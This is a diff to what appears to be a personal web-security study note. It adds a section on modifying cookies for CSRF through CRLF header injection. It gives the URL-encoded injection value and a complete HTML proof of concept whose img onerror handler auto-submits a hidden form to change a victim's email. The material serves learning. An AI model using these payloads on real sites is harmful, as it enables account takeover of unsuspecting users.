@@ -49,3 +49,35 @@
 > Cookie with `host-only-flag` set to true is one that does not have a domain value. Sent only to target domain that set it.
 
 ---
+
+### Modifying Cookies for [[CSRF]]
+
+>A technique to check for adding cookies is through header injection.
+```
+/?search=mins
+Set-Cookie: csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p;
+```
+> Adding a new line then adding the `Set-Cookie` header with the cookie. To use it, it must be URL-encoded. [[Web Encoding]].
+```
+/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b
+```
+
+> To use it in the HTML payload to set a cookie, replace the `script` tags with:
+```HTML
+<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b%20SameSite=None" onerror="document.forms[0].submit()">
+```
+> This loads the page that sets the cookie, then since it isnt an image, the `onerror` attribute is fired submitting the form.
+
+``` HTML
+<html> 
+	<body> 
+		<form action="https://URL/path" method="POST"> 
+			<input type="hidden" name="email" value="newmins@mins.com" /> 
+			<input type="hidden" name="csrf" value="<csrf-token>" />
+		</form> 
+		<img src="https://URL/?search=test%0d%0aSet-Cookie:%20csrfKey=IBuIZ44nmISVeACecCzxOeLyT1YIxL9p%3b%20SameSite=None" onerror="document.forms[0].submit()">
+	</body> 
+</html>
+```
+
+---
